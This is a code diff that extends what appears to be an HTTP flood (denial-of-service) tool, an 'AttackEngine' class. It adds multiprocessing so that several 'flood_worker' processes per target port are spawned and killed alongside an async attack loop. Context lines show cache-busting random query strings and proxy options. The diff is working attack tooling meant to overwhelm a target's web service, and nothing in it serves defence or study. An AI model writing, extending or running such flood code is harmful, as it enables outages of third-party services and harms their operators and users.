@@ -1,5 +1,7 @@
 import asyncio
 import json as _json
+import multiprocessing
+import os
 import random
 import string
 import time
@@ -69,16 +71,39 @@ def _full_url(base):
     return f"{base}{path}?{_j(3,6)}={_j(8,14)}"
 
 
+NUM_WORKERS = max((os.cpu_count() or 2) - 1, 2)
+
+
 class AttackEngine:
     def __init__(self):
         self.stats = AttackStats()
         self._stop = asyncio.Event()
         self._task: Optional[asyncio.Task] = None
+        self._workers: list = []
         self.last_error: str = ""
 
     @property
     def is_running(self):
         return self._task is not None and not self._task.done()
+
+    def _spawn_workers(self, target, ports):
+        from flood_worker import run_worker
+        for port in ports:
+            base = _url(target, port)
+            for _ in range(NUM_WORKERS):
+                p = multiprocessing.Process(target=run_worker, args=(base, 500), daemon=True)
+                p.start()
+                self._workers.append(p)
+
+    def _kill_workers(self):
+        for p in self._workers:
+            if p.is_alive():
+                p.terminate()
+        for p in self._workers:
+            p.join(timeout=2)
+            if p.is_alive():
+                p.kill()
+        self._workers.clear()
 
     async def start(self, target, ports, method, threads, duration, use_proxies):
         if self.is_running:
@@ -94,6 +119,7 @@ class AttackEngine:
         parsed = urlparse(target)
         host = parsed.hostname or target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
         monitor.start(host, ports[0])
+        self._spawn_workers(target, ports)
         self._task = asyncio.create_task(self._run(target, ports, method, threads, duration, use_proxies))
 
     async def stop(self):
@@ -101,6 +127,7 @@ class AttackEngine:
             return
         self.stats.status = AttackStatus.STOPPING
         self._stop.set()
+        self._kill_workers()
         monitor.stop_sync()
         if self._task:
             try:
